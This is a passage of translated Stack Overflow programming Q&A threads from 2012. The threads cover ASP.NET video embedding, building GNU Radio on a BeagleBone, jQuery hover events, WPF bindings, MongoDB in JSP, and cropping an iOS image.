                                showcontrols="1" showdisplay="1" showstatusbar="1" 
                                 type="application/x-mplayer2" width="424"></embed> 
```

像这样在代码隐藏中设置 src。

```
 Video.Attributes.Add("src","C:\Users\3embed\Documents\Visual Studio 2010\Projects\HeritageWeb\HeritageWeb\Videos\tum-ho.mp4"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T11:01:48.473

```
<object id="Object1" classid="clsid:6BF52A52-394A-11D3-B153-00C04F79FAA6">
                               <param name="url" value="<%=GetVideoFilePath()%>" / >
                        <param name="http://" />
                        <param name="AutoStart" value="1" />
                        <param name="ShowControls" value="1" />
                        <param name="ShowStatusBar" value="1" />
                        <param name="ShowDisplay" value="1" />
                        <param name="stretchToFit" value="1" />
                        <embed autostart="0" filename="" height="379" 
                            pluginspage="http://www.microsoft.com/Windows/Downloads/Contents/MediaPlayer/" 
                            showcontrols="1" showdisplay="1" showstatusbar="1" 
                            src="<%=GetVideoFilePath()" type="application/x-mplayer2" width="424"></embed>

</embed> 
```

您必须在后面的页面代码中创建一个名为 GetVideoFilePath 的方法，并在那里执行所有与数据库相关的工作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-03T11:04:28.577

如果一切都失败了，请使用文字并从您的数据库中填充源。

```
Literal.text = "<object id=""Object1"" classid=""clsid:6BF52A52-394A-11D3-B153-00C04F79FAA6"">
                           <param name=""url"" value=""C:\Users\3embed\Documents\Visual Studio 2010\Projects\HeritageWeb\HeritageWeb\Videos\tum-ho.mp4"" / >
                    <param name=""http://"" />
                    <param name=""AutoStart"" value=""1"" />
                    <param name=""ShowControls" value=""1"" />
                    <param name=""ShowStatusBar" value=""1"" />
                    <param name=""ShowDisplay" value=""1"" />
                    <param name=""stretchToFit"" value=""1"" />
                    <embed autostart=""0"" filename="""" height=""379"" 
                            pluginspage=""http://www.microsoft.com/Windows/Downloads/Contents/MediaPlayer/"" 
                        showcontrols=""1"" showdisplay=""1"" showstatusbar=""1"" 
                        src=" & your path here & " type=""application/x-mplayer2"" width=""424""></embed>

</embed>" 
```

类似的东西（未经测试，但你明白了。）

# ubuntu - cmake 在安装 GNU RADIO 时停止

> ID：11309455
> 
> 赞同：0
> 
> 时间：2012-07-03T10:56:57.093
> 
> 标签：ubuntu, makefile, cmake, arm, gnuradio

我正在尝试在我的嵌入式设备中安装 GNU Radio（安装了 ubuntu 12.04 的 beagle bone）。

按照此[Gnuradio 安装说明](http://gnuradio.org/redmine/projects/gnuradio/wiki/BuildGuide) 页面的说明进行操作后，我被困在“MAKE”中。

由于我使用的是 ARM 处理器：

```
root@omap:/opt/gnuradio/build# cat /proc/cpuinfo
Processor   : ARMv7 Processor rev 2 (v7l)
BogoMIPS    : 274.24
Features    : swp half thumb fastmult vfp edsp thumbee neon vfpv3 tls 
CPU implementer : 0x41
CPU architecture: 7
CPU variant : 0x3
CPU part    : 0xc08
CPU revision    : 2

Hardware    : am335xevm
Revision    : 0000
Serial      : 0000000000000000 
```

我在做：

```
# cmake  -DCMAKE_CXX_FLAGS:STRING="-mcpu=cortex-a8 -mfpu=neon -mfloat-abi=softfp -g" \

-DCMAKE_C_FLAGS:STRING="-mcpu=cortex-a8 -mfpu=neon -mfloat-abi=softfp -g" \

 /opt/gnuradio 
```

这就是我最后得到的：

```
-- ######################################################
-- # Gnuradio enabled components                         
-- ######################################################
--   * python-support
--   * testing-support
--   * volk
--   * doxygen
--   * gruel
--   * gnuradio-core
--   * gnuradio-companion
--   * gr-fft
--   * gr-filter
--   * gr-atsc
--   * gr-audio
--   * gr-digital
--   * gr-noaa
--   * gr-pager
--   * gr-qtgui
--   * gr-trellis
--   * gr-utils
--   * gr-video-sdl
--   * gr-vocoder
--   * gr-fcd
--   * gr-wavelet
--   * gr-wxgui
-- 
-- ######################################################
-- # Gnuradio disabled components                        
-- ######################################################
--   * sphinx
--   * gr-comedi
--   * gr-uhd
--   * gr-shd
-- 
-- Using install prefix: /usr/local
-- Building for version: 3.6.2git-117-gf8581fb4 / 3.6.2git
-- Configuring done
-- Generating done
-- Build files have been written to: /opt/gnuradio/build 
```

之后当我做的时候，它卡住了..

```
root@omap:/opt/gnuradio/build# make -k
[  1%] Built target volk
[  1%] Built target test_all
[  2%] Built target volk_profile
[  2%] Built target doxygen_target
[  3%] Built target gruel
[  3%] Built target test_gruel
[  3%] Built target _pmt_swig_doc_tag
[  3%] Built target _pmt_swig_swig_tag
[  3%] Built target _pmt_swig
[  3%] Built target pygen_gruel_src_swig_6bac3
[  3%] Built target pygen_gruel_src_python_16cbc
[  4%] Built target pygen_gruel_src_python_319f9
[ 34%] Built target gnuradio-core
[ 34%] Built target gnuradio-config-info
[ 34%] Built target gr_core_rstest
[ 36%] Built target test-gnuradio-core
[ 36%] Built target benchmark_dotprod_ccc
[ 36%] Built target benchmark_dotprod_ccf
[ 36%] Built target benchmark_dotprod_fcc
[ 36%] Built target benchmark_dotprod_fff
[ 36%] Built target benchmark_dotprod_fsf
[ 36%] Built target benchmark_dotprod_scc
[ 36%] Built target benchmark_nco
[ 36%] Built target benchmark_vco
[ 36%] Built target gr_core_test_all
[ 36%] Built target test_filter
[ 36%] Built target test_general
[ 36%] Built target test_runtime
[ 36%] Built target test_vmcircbuf
[ 36%] Built target _filter_swig_doc_tag
[ 36%] Built target _general_swig_doc_tag
[ 36%] Built target _gengen_swig_doc_tag
[ 40%] Built target gengen_generated
[ 40%] Built target filter_generated
[ 40%] Built target _gnuradio_core_filter_swig_tag
[ 41%] Built target _runtime_swig_doc_tag
[ 42%] Built target _gnuradio_core_filter
[ 42%] Built target _gnuradio_core_general_swig_tag
[ 42%] Building CXX object gnuradio-core/src/lib/swig/CMakeFiles  
    /_gnuradio_core_general.dir/gnuradio_core_generalPYTHON_wrap.cxx.o 
```

在这个地方，内存完全用完了（256 MB DDR2 RAM）。我什至不得不进行 256 MB 的 linux-swap 以避免“虚拟内存耗尽”错误。

谁能告诉我这里发生了什么以及如何解决这个问题。

ps：有没有人在beagle-bone 上安装了GNU radio？

提前致谢

萨纳坦

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-18T20:36:17.087

这是一个众所周知的问题。您的嵌入式设备上没有足够的 RAM 来实际构建 GNURadio。GCC实际上正在耗尽内存空间，并且正在死亡。你的虚拟内存空间有帮助，但 Swig 是一头野兽。

你有几个选择：

1.  在另一个系统上交叉编译 GNURadio 并将 ipkg / binary / 等移动到您的嵌入式设备。
2.  使用预打包的二进制安装安装 GNURadio（这些可用于 Angstrom - 不确定 Ubuntu ARM）。
3.  通过网络挂载您的嵌入式设备，并将其从另一台机器直接交叉编译到文件系统中

还有一些其他的，但这些是立即想到的选项。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-10T20:42:08.217

你试过`make`没有这个`-k`选项吗？

# javascript - 模块模式单元测试

> ID：11309456
> 
> 赞同：0
> 
> 时间：2012-07-03T10:56:58.030
> 
> 标签：javascript, jquery, unit-testing, module

在假设的导航模块的以下实现中，模块对象返回诸如`isOverBinded`或`isNavTurnedOff`基本上返回其他方法的结果值的属性。

然后在测试用例中使用此方法来检查属性调用是否导致其预期结果。

是否应该保留这些方法，或者有问题的原始方法返回相应的值和要在测试用例中使用的相同方法？

目前的代码是：

```
var navModule = (function(element) {

        var nav = {};

        var navHTMLobjs = {

            navList : element,

            listItems : element.find('li'),

            listLinks : element.find('a')

        };

        nav.bindOver = function() {

            navHTMLobjs.navList.on('mouseover mouseout', 'li a', function(e) {

                if (e.type == 'mouseover') {

                    $(this).addClass('over');

                }

                if (e.type == 'mouseout') {

                    $(this).removeClass('over');
                }

            });

        };

        nav.isOverBinded = function(){

            return navHTMLobjs.navList.data('events').hasOwnProperty('mouseover')

                && navHTMLobjs.navList.data('events').hasOwnProperty('mouseout');

        };

        nav.turnOff = function() {

            navHTMLobjs.navList.off('mouseover mouseout');

        };

        nav.isNavTurnedOff = function() {

            return !navHTMLobjs.navList.data.hasOwnProperty('events');

        };

        nav.init = function() {

            this.bindOver();

        };

        return nav;

    });

    var myNav = new navModule($('#nav'));

    /// Test cases:

    module('Navigation module');

    test('Binding total', function() {

        myNav.init();

        equal(myNav.isOverBinded(), true, "Does the init function attach all events?");

    });

    test('Unbinding total', function() {

        myNav.turnOff();

        equal(myNav.isNavTurnedOff(), true, "Does the cancel function correctly unbind events?");

    }); 
```

例如，我应该更改`nav.bingOver`为：

```
nav.bindOver = function() {

            navHTMLobjs.navList.on('mouseover mouseout', 'li a', function(e) {

                if (e.type == 'mouseover') {

                    $(this).addClass('over');

                }

                if (e.type == 'mouseout') {

                    $(this).removeClass('over');
                }

            });

            return navHTMLobjs.navList.data('events').hasOwnProperty('mouseover')

                && navHTMLobjs.navList.data('events').hasOwnProperty('mouseout');

        }; 
```

...然后在测试用例中使用相同的方法，如下所示？

```
test('Binding total', function() {

        myNav.init();

        equal(myNav.bindOver(), true, "Does the init function attach all events?");

    }); 
```

两者有什么区别？

非常感谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T14:12:29.293

假设应用程序的其他部分不需要独立验证事件是否已被订阅，则`bindOver()`不应返回任何值。此外，`isOverBinded()`不属于导航模块。它的存在纯粹是为了帮助实现测试。在这种情况下，该功能应该在测试套件中。

```
var navModule = (function(element) {

    var nav = {};

    var navHTMLobjs = {
        navList : element,
        listItems : element.find('li'),
        listLinks : element.find('a')
    };

    nav.bindOver = function() {
        navHTMLobjs.navList.on('mouseover mouseout', 'li a', function(e) {
            if (e.type == 'mouseover') {
                $(this).addClass('over');
            }

            if (e.type == 'mouseout') {
                $(this).removeClass('over');
            }
        });
    };

    nav.turnOff = function() {
        navHTMLobjs.navList.off('mouseover mouseout');
    };

    nav.init = function() {
        this.bindOver();
    };

    return nav;
});

//var myNav = new navModule($('#nav'));

/// Test cases:

module('Navigation module');

// you might already have such a in memory object 
$root = $('<ul></ul>').append('<li><a href="#"></a></li><li><a href="#"></a></li>'); 
var myNav = new navModule($root);

test('Binding total', function() {

    myNav.init();

    equal(isOverBinded(), true, "Does the init function attach all events?");

});

test('Unbinding total', function() {

    myNav.turnOff();

    equal(isNavTurnedOff(), true, "Does the cancel function correctly unbind events?");

});

var isNavTurnedOff = function() {
    return $root.data('events').hasOwnProperty('mouseover') && $root.data('events').hasOwnProperty('mouseout');
}

var isOverBinded = function() {
    return $root.data.hasOwnProperty('events') === false;
} 
```

归根结底，我觉得函数是否应该返回值应该取决于函数的用法，而不是为了使测试更容易。

# c# - 如何为 windows phone 7 应用程序设置背景图像

> ID：11309464
> 
> 赞同：0
> 
> 时间：2012-07-03T10:57:34.190
> 
> 标签：c#, windows-phone-7

我想为 Windows Phone 7 的整个应用程序设置背景图像。我想图像的大小应该是 480 x 800，我已经有了。

是否应该在 App.xaml 或 WMAppManifest.xaml 中设置？如果是这样，请指向我的代码示例。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T11:00:13.597

你试过这种方法吗？

```
private static void SetAppBackground(string imageName) 
    {
      var app = Application.Current as App;
      if (app == null)
        return;

      var imageBrush = new ImageBrush
                 {
                   ImageSource = new BitmapImage(new Uri(imageName, UriKind.Relative))
                 };
      app.RootFrame.Background = imageBrush;
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-11T23:59:59.703

我认为您不需要为每个页面设置背景图像。如果将此代码段添加到 App.xaml ：

```
<ImageBrush x:Key="imgKey" ImageSource="/Images/imgName.png" /> 
```

并将 MainPage.xaml 中的 Grid 配置更改为：

```
<Grid x:Name="LayoutRoot" Background="{StaticResource imgKey}"> 
```

您的图像应显示在应用的所有页面上。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T10:59:59.557

无法全局设置背景图像。您需要为每个页面设置它。

# html - 看不到

> ID：11309465
> 
> 赞同：0
> 
> 时间：2012-07-03T10:57:38.650
> 
> 标签：html, css

知道为什么我看不到 H1 吗？

```
<div id="getTheProducts" style="clear: both; margin-top: 15px; margin-bottom: 15px; border: 1px solid #DDD;background-color: #f8f8f8; width: 857px; height: 50px; text-align: left;">
<div class="clear"></div>
<div id="getProductsSlide" style="width: 850px; overflow: hidden; position: relative;">
<div class="getProducts_Cover" style="width:56950px; position: absolute; height:50px;">
<div class="getProducts_Page" style="display: block; width: 850px; float: left; height: 50px; color: #000;">
<h1>2012 - January Newsletter</h1></div>
</div></div></div></div> 
```

Chrome在那里显示它，它概述了它，它甚至告诉我宽度/高度，但我实际上看不到文字。我把它放到一个 HTML 页面中，我仍然看不到它。我一定是在某处遗漏了一条 CSS 规则。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T11:02:34.030

嗨，你可以删除`overflow:hidden;`

```
<div id="getTheProducts" style="clear: both; margin-top: 15px; margin-bottom: 15px; border: 1px solid #DDD;background-color: #f8f8f8; width: 857px; height: 50px; text-align: left;">
<div class="clear"></div>
<div id="getProductsSlide" style="width: 850px; position: relative;"> // **here remove overflow hidden**
<div class="getProducts_Cover" style="width:56950px; position: absolute; height:50px;">
<div class="getProducts_Page" style="display: block; width: 850px; float: left; height: 50px; color: #000;">
<h1>2012 - January Newsletter</h1></div>
</div></div></div></div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:11:56.747

禁用标题显示的是*position: absolute;* 在

```
<div class="getProducts_Cover" style="width:56950px; position: absolute; height:50px;"> 
```

如果可能，将其更改为

```
<div class="getProducts_Cover" style="width:56950px; position: relative; height:50px;"> 
```

# c# - DataTemplate 不绘制视图，而是打印它在 Collection 中遇到的每个 ViewModel 类型的类型名

> ID：11309470
> 
> 赞同：0
> 
> 时间：2012-07-03T10:57:57.287
> 
> 标签：c#, wpf

```
 <Grid>
        <ItemsControl ItemsSource="{Binding ScreenViewModelCollection}">
            <ItemsControl.Resources>
                <DataTemplate DataType="{x:Type redScreenView:RedScreenView}">
                    <Grid>
                        <redScreenView:RedScreenView/>
                    </Grid>
                </DataTemplate>

                <DataTemplate DataType="{x:Type greenScreenView:GreenScreenView}">
                    <Grid>
                        <greenScreenView:GreenScreenView/>
                    </Grid>
                </DataTemplate>

            </ItemsControl.Resources>
        </ItemsControl> 
```

它不是为它的 ViewModel 绘制视图，而是打印视图所属的命名空间！但使用 ItemTemplate 仅适用于其中之一。并且 ItemTemplate 不能有多个内容:(

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T12:30:53.957

当我怀疑你的contains时，你`DataTemplates`是。`Views``ScreenViewModelCollection``ViewModels`

您只需要将`DataType`属性`ViewModels`改为`Views`

```
<DataTemplate DataType="{x:Type myViewModels:RedScreenViewModel}">
    <Grid>
        <redScreenView:RedScreenView/>
    </Grid>
</DataTemplate>

<DataTemplate DataType="{x:Type myViewModels:GreenScreenViewModel}">
    <Grid>
        <greenScreenView:GreenScreenView/>
    </Grid>
</DataTemplate> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:53:34.030

我错过了 redScreenView/greenScreenView 命名空间的定义、ScreenViewModelCollection 的类型、ItemsControl.ItemTemplate 的 xaml - 所以我只是假设：

编辑：请查看您的 xaml，我认为您有一些错别字。您的 DataTemplates 的 DataType 应该是视图模型**。**数据模板的内容当然是视图。

尽管如此，**本地**定义命名空间并且必须在您的窗口/用户控件定义中。例如

```
 <UserControl xmlns:local="clr-namespace:MyWpfApplication1.MyTest.ViewModels" 
              xmlns:views="clr-namespace:MyWpfApplication1.Controls.Views" 

    <ItemsControl ItemsSource="{Binding ScreenViewModelCollection}">
        <ItemsControl.Resources>
            <DataTemplate DataType="{x:Type local:RedScreenViewModel}">
                <Grid>
                    <views:RedScreenView/>
                </Grid>
            </DataTemplate>
            <DataTemplate DataType="{x:Type local:GreenScreenViewModel}">
                <Grid>
                    <views:GreenScreenView/>
                </Grid>
            </DataTemplate>
        </ItemsControl.Resources>
        <ItemsControl.ItemTemplate>
            <DataTemplate>
                <ContentPresenter Content="{Binding}"/>
            </DataTemplate>
        </ItemsControl.ItemTemplate>
    </ItemsControl> 
```

这个 ItemTemplate 对你有用吗？

# c# - 如何创建一个文件夹，然后在其中创建一个 csv 文件

> ID：11309472
> 
> 赞同：-1
> 
> 时间：2012-07-03T10:58:01.863
> 
> 标签：c#

我有一个已经创建 csv 文件的 exe。如果我将 exe 保存在 C:/EXE 中，则 cvs 文件会自动在 C:/EXE 文件夹中创建。C# 代码使用 StreamWriter 来完成此操作：

```
using (TextWriter log = new StreamWriter(errorLog + errorBatchNumber.ToString("000") + ".csv", true))
{
    if (errorCount == 0)
    {
        log.WriteLine("Error message");
    }
    log.WriteLine(link.StatusMessage);
    log.Close();
} 
```

我需要补充的：

1.  首先需要创建一个文件夹，用于保存 csv 文件。
2.  此文件夹将在保存 EXE 的位置创建，在此示例中：C:/EXE
3.  创建文件夹和 cvs 文件后，需要通过代码对其进行压缩。（但我需要先完成1和2）

有任何想法吗？提前谢谢各位！:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:03:04.083

会是这样的

```
DirectoryInfo di = new DirectoryInfo(@"C:\exe");
if(!di.Exists)
    di.Create(); 
```

然后您可以使用`di.FullName`获取目录来保存您的文件。

语法可能有点偏离，但它应该足以让你开始。[您也可以在 DirectoryInfo 上](http://msdn.microsoft.com/en-us/library/system.io.directoryinfo.aspx)查看MSDN 。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:03:23.967

如果您知道将保存 EXE 的路径，那么

1.  Directory.CreateDirectory(path + folderName) 创建文件夹
2.  [要压缩项目，请使用http://www.icharpcode.net/opensource/sharpziplib/](http://www.icsharpcode.net/opensource/sharpziplib/)或[http://wiki.sharpdevelop.net/SharpZipLib_MainPage.ashx](http://wiki.sharpdevelop.net/SharpZipLib_MainPage.ashx)上的 SharpZipLib

# jsp - 如何在 JSP 中使用 MONGODB

> ID：11309474
> 
> 赞同：0
> 
> 时间：2012-07-03T10:58:16.613
> 
> 标签：jsp, mongodb

我无法在 JSP 文件中创建 Mongo 变量：

```
<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Insert title here</title>
</head>
<body>
    <%
        out.println(request.getParameter("user"));
        Mongo mongo = new Mongo();
    %>
</body>
</html> 
```

它抛出： Mongo 无法解析为类型。你可以帮帮我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-03T02:56:27.443

```
 <%@ page language="java" 
    contentType="text/html; 
    charset=windows-1256"
     pageEncoding="windows-1256" 
     import="com.mongodb.BasicDBObject"
     import="com.mongodb.DB"
     import="com.mongodb.DBCollection"
     import="com.mongodb.DBCursor"
     import="com.mongodb.MongoClient"
     import="java.net.UnknownHostException"
      %> 
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> <html> 
     <head>
     <meta http-equiv="Content-Type" content="text/html; charset=windows-1256"> 
     <title> Test Page</title>
     </head> 
     <body> 

   <% MongoClient mongoClient = null;
try {
    mongoClient = new MongoClient();
} catch (UnknownHostException e1) {
    // TODO Auto-generated catch block
    e1.printStackTrace();
}
// or, to connect to a replica set, supply a seed list of members
//MongoClient mongoClient = new MongoClient(Arrays.asList(new ServerAddress("localhost", 27017),
  //                                    new ServerAddress("localhost", 27018),
    //                                  new ServerAddress("localhost", 27019)));

DB db = mongoClient.getDB("testdoc");
DBCollection coll;
coll = db.getCollection("testdoc");
BasicDBObject doc = new BasicDBObject("Number1", 1).
        append("Number2", 2).append("Number3", 3);

//System.out.println("Data Display");
coll.insert(doc);
DBCursor cursor = coll.find();
try {
   while(cursor.hasNext()) {
       System.out.println(cursor.next());
   }
} finally {
   //mongoClient.dropDatabase("test");
   cursor.close();

}
    %>
     </body>
     </html> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T13:44:34.607

尝试将导入添加到页面顶部：

```
<%@ page import="com.mongodb.Mongo" %> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-03T11:02:01.127

您在类路径中使用过以下 jar 吗？

```
MongoDB 1.8.1
MongoDB-Java-Driver 2.5.2 
```

参考[http://www.mkyong.com/mongodb/java-mongodb-hello-world-example/](http://www.mkyong.com/mongodb/java-mongodb-hello-world-example/)

# android - 在 Android 上移动轮廓

> ID：11309475
> 
> 赞同：1
> 
> 时间：2012-07-03T10:58:20.273
> 
> 标签：android, opencv, contour

我已经使用 OpenCV 2.3.1 和 Android 2.2 来查找位图中的轮廓，这似乎在三星 Galaxy Ace 上运行良好，但现在我需要帮助来移动这些轮廓。我的目标是使选定的轮廓在拖动到不同位置时跟随用户的手指。任何形式的帮助将不胜感激。

**编辑：** 我现在可以根据用户的触摸移动轮廓，但是它们不会停留在新位置。所以，我假设我需要从原始位置删除图像并在新位置重绘它。此外，它只有周围的轮廓移动，而不是轮廓内的图像像素。我更关心图像像素。如何让图像像素移动到新位置？如果我能以某种方式获得轮廓内像素的坐标，那也很棒。

抱歉，我想上传图片，但新成员现阶段似乎无法上传图片。例如 - 我有围绕粉红色线的轮廓。当我拖动时，只有轮廓移动，线条的黑色像素根本不移动。有什么方法可以让粉红色轮廓内的黑色像素移动？

另一个问题是，当我在一个封闭的图形（如圆形或正方形）上尝试我的代码时，我会得到两个轮廓。一个用于内部边界，一个用于外部边界。但正如我之前所说，我对图像像素更感兴趣。请帮忙。

PS - 图像可以是任何东西，任何形状。我刚刚举了一条线的例子。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:18:41.487

首先，您必须将`TouchListener`/ `ClickListener`（或其他内容，我不知道`Android API`）添加到您的位图或画布中。

当用户触摸屏幕（监听器被触发）时，您必须确定用户选择了哪个轮廓。为此使用[pointPolygonTest](http://opencv.itseez.com/modules/imgproc/doc/structural_analysis_and_shape_descriptors.html?highlight=pointpolygontest#pointpolygontest)函数。

关于移动：`Contour`只是 s 的序列 ( `vector`)，`Point`所以如果你想移动（移动）一些轮廓，你必须执行以下操作（**c++**代码）：

```
void moveContour(vector<Point>& contour, int dx, int dy)
{
    for (size_t i=0; i<contour.size(); i++)
    {
        contour[i].x += dx;
        contour[i].y += dy;
    }
} 
```

希望能帮助到你。

# jquery - 如何更改此 jquery 使其适用于鼠标悬停和鼠标移出

> ID：11309479
> 
> 赞同：0
> 
> 时间：2012-07-03T10:58:29.623
> 
> 标签：jquery

我希望它在鼠标悬停时打开，然后在鼠标离开包含 div 而不仅仅是 h2 时再次关闭，尝试了一些事情但没有运气。

HTML：

```
<div class="deliverycontainer">
<h2 style=" margin-left: 2px; margin-right: 2px; color: #6588b2; background: #e6edf5;  padding: 10px; cursor: pointer;">Europe: £7.50 (or free on orders over £100)</h2>
<div class="delivery_times">
<table>
<tbody>
<th>
Country
</th>
<th>
Delivery Times (approx)
</th>
<tr>
<td>Belgium</td>
<td>+ 1 day</td>
</tr>
</tbody>
</table>
</div>
</div> 
```

CSS：

```
table {  width: 100%; }

table th { font-size: 14px; padding: 5px; background: #e6edf5; }

table tr {width: 48%; margin: 1%;}

table td { font-size: small; text-align: center; padding: 6px; background: #e6edf5;}

</style> 
```

jQuery

```
<script type="text/javascript">

$(document).ready(function(){
    dynamicFaq();
});

function dynamicFaq(){
    $('.delivery_times').hide();
    $('h2').bind('click', 'hover', function(){

        $(this).toggleClass('open').next().slideToggle('fast');

    });
}

</script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:02:14.953

你的意思是：

```
$("h2").hover(function() {
  $(".delivery_times").show();
},
function() {
  $(".delivery_times").hide();
}); 
```

或者

```
$("h2").on({
  mouseenter: function () {
    $(".delivery_times").show();
  },
  mouseleave: function () {
   $(".delivery_times").hide();
  }
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:14:15.937

由于有两个不同的元素，你将不得不做这样的事情：

```
$(function(){
    var timer;
    $('.delivery_times').hide();
    $('h2, .delivery_times').on({
        mouseenter: function(e) {
            if (e.target.tagName==='H2') $(this).addClass('open');
            $('.delivery_times').slideDown('fast');
            clearTimeout(timer);
        },
        mouseleave: function(e) {
            timer = setTimeout(function() {
                $('h2').removeClass('open');
                $('.delivery_times').slideUp('fast');
            }, 200);
        }
    });
}); 
```

[小提琴](http://jsfiddle.net/z2LYb/6/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-03T11:01:55.817

尝试这个

```
$("h2").on('mouseenter', function() { 
    alert('mouse enter');
}).on('mouseleave', function () {
    alert('mouse leave');
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-03T11:13:40.933

试试这个，如果错了，请评论

```
$("h2").on("mouseenter",function (e) {
    $(".delivery_times").show();
  })
$("h2").parent().on("mouseleave",function () {
   $(".delivery_times").hide();
}); 
```

# ios - 从转换后的 UIImageView 裁剪 UIImage

> ID：11309480
> 
> 赞同：4
> 
> 时间：2012-07-03T10:58:30.557
> 
> 标签：ios, objective-c, uiimageview, uiimage, crop

我让用户从相机中捕捉图像或从库中选择一个。这张图片我显示在一个`UIImageView`. 用户现在可以在边界框中缩放和定位图像，就像使用`UIImagePickerController`when`allowsEditing`设置为所做的一样`YES`。

当用户对结果感到满意并点击完成时，我想制作一个裁剪的`UIImage`. 使用时会出现问题，`CGImageCreateWithImageInRect`因为这没有考虑缩放。变换应用于 imageView，如下所示：

```
CGAffineTransform transform = CGAffineTransformScale(self.imageView.transform, newScale, newScale);
[self.imageView setTransform:transform]; 
```

使用手势识别器。

我假设正在发生的事情是；UIImageView 被缩放和移动，然后将 UIViewContentModeScaleAspectFit 应用到 UIImage 是持有的，当我要求它裁剪图像时，它就是这样做的 - 不考虑缩放定位。我这样认为的原因是，如果我不缩放或移动图像，而是直接点击完成，裁剪就可以了。

我像这样裁剪图像：

```
- (UIImage *)cropImage:(UIImage*) img toRect:(CGRect)rect {

    CGFloat scale = [[UIScreen mainScreen] scale];

    if (scale>1.0) {        
        rect = CGRectMake(rect.origin.x*scale , rect.origin.y*scale, rect.size.width*scale, rect.size.height*scale);        
    }

    CGImageRef imageRef = CGImageCreateWithImageInRect([img CGImage], rect);
    UIImage *result = [UIImage imageWithCGImage:imageRef scale:self.imageView.image.scale orientation:self.imageView.image.imageOrientation];
    //    UIImage *result = [UIImage imageWithCGImage:imageRef]; 
    CGImageRelease(imageRef);
    return result;
} 
```

从作为我的主视图的子视图的视图（方形覆盖框，如 UIImagePickerController 中）传入cropRect。主 UIView 有一个可缩放的 UIImageView 和一个显示裁剪矩形的 UIView。

我怎样才能获得“所见即所得”的裁剪以及我必须考虑哪些因素。或者，如果我应该以不同的方式实现层次结构或缩放，也许会提出建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T11:34:05.557

尝试一个简单的技巧。Apple 在其网站上提供了示例，以展示如何使用代码放大照片。完成缩放后，使用图形上下文获取边界视图的帧大小，并以此获取图像。例如 Uiview 包含具有缩放图像的滚动视图。所以滚动视图会缩放，你的图像也会缩放，现在获取边界 UIview 的帧大小，并从中创建图像上下文，然后将其保存为新图像。告诉我这是否有意义。

干杯:)

# c# - 以编程方式绑定到不断变化的 ViewModel

> ID：11309482
> 
> 赞同：2
> 
> 时间：2012-07-03T10:58:41.310
> 
> 标签：c#, wpf, mvvm

我正在创建一个应用程序，其工作方式类似于某些 Microsoft 应用程序的“向导”组件。为了表示这一点，我有两个 ViewModel：

```
class WizardVm {
    public string Name { get; set; }
    public ICommand QuitCommand { get { /* ommitted */ } }
    public WizardStepVm CurrentStep { get; set; }
}

class WizardStepVm {
    public string StepName { get; set; }
    public string StepText {get; set; }
} 
```

在视图中，`WizardVm`绑定到一个窗口，并`WizardStepVm`绑定到窗口内的一个内容面板。我正在以编程方式创建内容控件，并将其添加到 WizardView 中，如下所示：

```
// in the "DataContextChanged" handler for the WizardView
var bn = new Binding("CurrentStep");
bn.Mode = BindingMode.OneWay;

var contentControl = new ContentControl();
contentControl.SetBinding(ContentControl.ContentProperty, bn);
WizardViewStackPanel.Children.Add(contentControl); 
```

最初创建 WizardView 时，这会正确呈现。但是，如果`CurrentStep`发生更改，视图不会更新以反映这一点。CurrentStep 发生变化，但 ContentControl 继续显示原始的 WizardStepVm。此外，旧的 WizardStepVm 继续存在于内存中，它的字符串属性仍然可以更改（从视图中）。

为什么是这样？我必须做什么才能使内容控件更改以反映它绑定到的 ViewModel 中的更改？

（实际上有充分的理由以编程方式执行此操作。但是，xaml 解决方案也受到赞赏。）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:07:32.853

您的类需要实现[INotifyPropertyChanged](http://msdn.microsoft.com/en-us/library/system.componentmodel.inotifypropertychanged.aspx)接口，以在每次其属性之一更改时通知 UI：

```
class WizardStepVm : INotifyPropertyChanged {
    public event PropertyChangedEventHandler PropertyChanged;

    private void NotifyPropertyChanged(String info)
    {
        if (PropertyChanged != null)
        {
            PropertyChanged(this, new PropertyChangedEventArgs(info));
        }
    }
    private string m_stepName;
    public string StepName {
      get {
        return m_stepName;
      }
      set {
        m_stepName = value; 
        NotifyPropertyChanged("StepName");
      }
    }
    /* etc... */
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-03T11:21:23.827

首先，您的视图模型应该实现 INotifyPropertyChanged 或只使用 BindingMode OneTime。（请参阅[这篇](http://code.logos.com/blog/2008/10/detecting_bindings_that_should_be_onetime.html)文章）

不过，您可以使用 viewmodel first 方法和 datatemplates 轻松地做您想做的事

```
public class WizardVm {
   public string Name { get; set; }
